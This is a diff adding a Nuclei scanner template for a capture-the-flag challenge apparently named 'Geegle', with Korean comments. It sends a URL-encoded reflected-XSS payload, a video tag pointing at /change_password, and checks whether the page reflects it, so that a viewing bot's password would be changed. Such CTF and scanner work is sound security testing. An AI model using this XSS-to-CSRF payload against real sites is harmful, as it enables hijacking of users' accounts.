@@ -1,0 +1,24 @@
+id: geegle-csrf-exploit
+
+info:
+  name: Geegle CTF CSRF Exploit Check
+  author: jebeen
+  severity: critical
+  description: Checks if the change_password payload can be injected via video tag.
+  tags: ctf, csrf, xss
+
+http:
+  - method: GET
+    path:
+      # [공격 Payload]
+      # <video src="/change_password?pw=nuclei_test"> 를 URL 인코딩해서 전송
+      - "{{BaseURL}}/vuln?param=%3Cvideo%20src%3D%22%2Fchange_password%3Fpw%3Dnuclei_test%22%3E"
+
+    matchers:
+      # [검증]
+      # 서버가 우리가 보낸 "비밀번호 변경 요청 태그"를 그대로 반사(Reflect)하는지 확인
+      - type: word
+        part: body
+        words:
+          # 응답 본문에 이 문자열이 그대로 있으면, 봇이 이걸 볼 때 비밀번호가 바뀜
+          - '<video src="/change_password?pw=nuclei_test">'
